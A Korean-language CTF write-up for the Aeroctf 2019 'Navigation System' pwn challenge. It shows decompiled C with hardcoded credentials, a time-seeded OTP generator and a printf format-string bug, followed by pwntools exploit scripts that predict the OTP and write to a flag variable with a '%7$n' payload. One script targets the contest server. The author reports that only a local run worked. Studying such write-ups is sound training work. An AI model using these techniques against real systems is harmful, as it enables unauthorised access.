---
title: Aeroctf Writeup
date: 2019-03-11
---

# Navigation System

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-48h]
  unsigned int v5; // [esp+4h] [ebp-44h]
  char s1[4]; // [esp+8h] [ebp-40h]
  char v7[4]; // [esp+18h] [ebp-30h]
  unsigned int v8; // [esp+3Ch] [ebp-Ch]
  int *v9; // [esp+40h] [ebp-8h]

  v9 = &argc;
  v8 = __readgsdword(0x14u);
  wlc_msg();
  __isoc99_scanf("%16s", &s1[2]);
  printf("Password: ");
  fflush(stdout);
  __isoc99_scanf("%32s", &v7[3]);
  if ( strcmp(&s1[2], valid_login) )
  {
    puts("Username is invalid!");
    exit(-1);
  }
  if ( strcmp(&v7[3], valid_password) )
  {
    puts("Passowrd is invalid!");
    exit(-2);
  }
  v5 = genOTPcode(&s1[2], &v7[3]);
  printf("Enter the OTP code: ");
  fflush(stdout);
  __isoc99_scanf("%d", &v4);
  if ( v5 == v4 )
    UserPanel((int)&s1[2]);
  puts("OTP is incorrect!");
  fflush(stdout);
  return -1;
}
```

id, pw는 하드코딩되어 있어 바로 가능한데 OTP 코드가 문제다.

```c
unsigned int __cdecl genOTPcode(char *a1, char *a2)
{
  time_t v2; // eax
  unsigned int v3; // eax

  v2 = time(0);
  srand(*a2 + *a1 + v2);
  v3 = rand();
  return v3 + (v3 >= 0xFFFFFFFF);
}
```

time 기반으로 랜드 생성이라 시드를 맞출 수 있다. *a2 , *a1 = 't' 이다.(id,pw 의 첫 바이트를 가져온다)

대회 때는 못 풀었고 하다가 다른 ctf로 넘어갔는데 다 지나고나서 시드를 다시 맞춰봤다  OTP만  넘어가게되면

```c
void __cdecl __noreturn UserPanel(int a1)
{
  int v1; // [esp+Ch] [ebp-Ch]

  puts("-------------------- User menu --------------------");
  printf("Hello, %s\n", a1);
  fflush(stdout);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("[1] Read latest report");
      puts("[2] Set a station");
      puts("[3] TODO");
      puts("[4] Exit");
      printf("> ");
      fflush(stdout);
      v1 = 4;
      __isoc99_scanf("%d", &v1);
      if ( v1 != 2 )
        break;
      setStation();
    }
    if ( v1 > 2 )
      break;
    if ( v1 != 1 )
      goto LABEL_13;
    readLastReport();
  }
  if ( v1 == 3 )
    UserExit();
  if ( v1 == 4 )
    UserExit();
LABEL_13:
  UserExit();
}
```

요 메뉴로 넘어가고

```c
unsigned int setStation()
{
  char buf[32]; // [esp+Ch] [ebp-2Ch]
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Set station > ");
  fflush(stdout);
  buf[read(0, buf, 0x20u)] = 0;
  printf("Station: ");
  printf(buf);
  putchar(10);
  return __readgsdword(0x14u) ^ v2;
}
```

요기의 포맷스트링을 이용해서

```c
int readLastReport()
{
  if ( flag )
    system("/bin/cat report.txt");
  else
    printf("[-] Access denied!");
  return putchar(10);
}
```

report.txt를 읽을 수 있다. 아마 저게 flag일 건데 사실 서버에는 rand가 계속 안맞아서 못해보고.. 로컬에서만 출력시켰다. 저게 flag가 아니어도 포맷스트링은 무한으로 가능하기 때문에 다른 식으로라도 풀 수 있다.

```python
from pwn import *
from ctypes import *
import time
from datetime import datetime

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

i = 0
while True:
	try:
		#tm = process('./time')
		#t = process('./binary')
		t = remote('185.66.87.233', 5002)
		#b = int(tm.recvline().replace('\n',''),10)
		#a = int(tm.recv().replace('\n',''),10)
		#tm.close()
		#log.success("rand ==> " + hex(a))
		#log.success("time ==> " + hex(b))

		libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
		#timestamp = time.mktime(datetime.today().timetuple())
		#b = int(float(timestamp))
		b = libc.time(0) + i
		log.success("time ==> " + hex(b))
		libc.srand(0x74*2 + b)
		a = libc.rand()
		log.success("rand ==> " + hex(a))

		r("Login:")
		s("test_account")
		r("Password:")
		s("test_password")
		r("Enter the OTP code:")
		s(a)

		print i 
		i = i + 1

		print t.recv()
		print t.recv()
		print t.recv()
		
		r(">")
		s("2")
		r(">")
		s(p32(0x0804C058) + "%7$n")
		r(">")
		s("1")
		
		t.interactive()
	except Exception as e:
		pass
	finally:
		t.close()
```

시드 맞추려고 계속 돌리는.. 것인데 c파일에서도 하고 cdll으로도 했는데 내가 시드를 못 맞춘 이유는 ㅋㅋㅋㅋㅋ scanf가 %d로 입력인데 그거 모르고 팩해서 보내버려서 안맞는 거였음… 그거 땜에 이상한 짓만….

```python
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
b = libc.time(0)
libc.srand(0x74*2 + b)
a = libc.rand()
```

이게 time based srand 맞추기가 참 좋은듯 하다. 여러가지로 해봤으니 언젠간 쓸일이 있겠지!

```python
from pwn import *
from ctypes import *
import time
from datetime import datetime

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

t = process('./binary')

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
#timestamp = time.mktime(datetime.today().timetuple())
#b = int(float(timestamp))
b = libc.time(0) + i
log.success("time ==> " + hex(b))
libc.srand(0x74*2 + b)
a = libc.rand()
log.success("rand ==> " + hex(a))

r("Login:")
s("test_account")
r("Password:")
s("test_password")
r("Enter the OTP code:")
s(a)

r(">")
s("2")
r(">")
s(p32(0x0804C058) + "%7$n")
r(">")
s("1")

t.interactive()
->
/bin/cat: report.txt: 그런 파일이나 디렉터리가 없습니다
```

음.. 나중엔 서버랑도 맞게 해야 할텐데 ㅠ 서버 시간 UTC로 바꿔도 안되길래 그냥 포기했다.. 서버도 너무 느리고해서 나중에 이런 문제 나오면 다시 제대로 맞춰봐야지!

